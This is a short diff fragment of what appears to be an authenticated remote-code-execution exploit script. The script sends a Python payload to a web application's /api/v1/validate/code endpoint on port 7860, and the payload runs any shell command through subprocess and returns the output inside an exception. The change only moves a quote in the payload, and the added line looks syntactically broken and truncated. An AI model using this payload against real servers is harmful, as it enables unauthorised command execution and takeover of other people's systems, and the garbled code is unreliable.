@@ -23,7 +23,7 @@ async def exec_auth(host, username, password, cmd):
         }
 
         data = {
-            "code":"\ndef exploit(\n    _=( lambda r: (_ for _ in ()).throw(Exception(f\"{r.stdout}{r.stderr}\")) )(\n        __import__('subprocess').run('%s', shell=True, cap>
+            "code":"\ndef exploit(\n    _=( lambda r: (_ for _ in ()).throw(Exception(f\"{r.stdout}{r.stderr}\")) )(\n"        __import__('subprocess').run('%s', shell=True, cap>
         }
 
         r = await client.post(url=f'http://{host}:7860/api/v1/validate/code', headers=headers, json=data)
